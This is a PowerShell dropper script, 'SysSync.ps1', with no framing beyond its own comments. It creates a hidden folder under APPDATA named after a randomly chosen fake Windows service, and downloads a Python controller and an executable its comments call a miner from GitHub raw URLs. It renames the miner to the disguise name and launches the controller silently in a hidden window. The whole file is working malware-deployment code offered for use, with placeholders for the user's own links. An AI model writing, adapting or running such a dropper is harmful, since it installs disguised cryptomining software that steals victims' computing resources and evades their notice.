# --- THE IGNITER (SysSync.ps1) ---
# Pick a random disguise from our list
$Skins = @("WinLogSvc", "NetHostUtil", "SysEventMgr", "DiskOptiCache", "PowerShellHost")
$ID = $Skins | Get-Random
$Path = "$env:APPDATA\$ID"

# 1. Configuration - REPLACE THESE WITH YOUR GITHUB RAW LINKS
$C_URL = "https://raw.githubusercontent.com/USER/REPO/main/core.py"
$M_URL = "https://raw.githubusercontent.com/USER/REPO/main/WinUpdate.exe"

# 2. Preparation - Create the hidden work environment
if (!(Test-Path $Path)) { 
    New-Item -ItemType Directory -Path $Path -Force | Out-Null 
}

# 3. Deployment - Pull down the brain and the engine
# We rename the miner to the disguise name immediately
Invoke-WebRequest -Uri $C_URL -OutFile "$Path\core.py"
Invoke-WebRequest -Uri $M_URL -OutFile "$Path\$ID.exe"

# 4. Activation - Launch the Python core silently
# We pass the random ID so the core knows how to disguise itself
if (Test-Path "$Path\core.py") {
    Start-Process -FilePath "pythonw.exe" -ArgumentList "`"$Path\core.py`" --id $ID" -WindowStyle Hidden
    Write-Host "Framework Successfully Deployed."
}
